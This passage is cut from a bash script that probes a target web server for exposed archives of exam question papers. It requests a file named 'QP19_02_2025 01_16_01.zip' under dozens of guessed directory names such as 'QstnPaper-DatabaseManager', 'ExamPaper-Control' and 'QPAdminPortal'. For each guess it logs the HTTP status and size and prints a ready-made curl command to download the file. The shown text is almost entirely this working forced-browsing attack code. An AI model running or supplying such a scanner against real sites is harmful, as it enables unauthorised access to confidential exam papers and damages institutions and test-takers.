${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Automation_QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper-DatabaseManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper-DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper-DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdminPortal/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdminPortal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdminPortal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMasterTool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMasterTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMasterTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Portal_QPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Portal_QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Portal_QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ManagementQPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ManagementQPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ManagementQPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Module_QPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Module_QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Module_QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControlAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControlAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControlAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBDataCloudSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBDataCloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBDataCloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper_Uploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper_Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper_Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Portal-QsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Portal-QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Portal-QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAuto-Panel/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAuto-Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAuto-Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Ops_QPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Ops_QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Ops_QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem-ProcessingSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem-ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem-ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMasterDataPipeline/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMasterDataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMasterDataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatch-FileProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatch-FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatch-FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDocCloudSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDocCloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDocCloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_PUploadService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_PUploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_PUploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBDataAutomation/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBDataAutomation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBDataAutomation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [CloudSync-QPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}CloudSync-QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}CloudSync-QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster_Processing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster_Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster_Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster_DatabaseManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster_DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster_DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Management_QPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Management_QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Management_QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFile-FileUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFile-FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFile-FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessingSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessingSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessingSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflow_Manager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflow_Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflow_Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [System-QPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}System-QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}System-QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaper-Control/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaper-Control/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaper-Control/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchUpload-QuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchUpload-QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchUpload-QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Management-QPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Management-QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Management-QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaper-Portal/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaper-Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaper-Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManagerUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManagerUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManagerUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService_Upload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService_Upload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService_Upload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Mgmt_QPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Mgmt_QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Mgmt_QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [PlatformQPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}PlatformQPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}PlatformQPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase_Workflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase_Workflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase_Workflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Module_QPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Module_QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Module_QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaper_DataSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaper_DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaper_DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor_Dashboard/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor_Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor_Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Sync-QPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
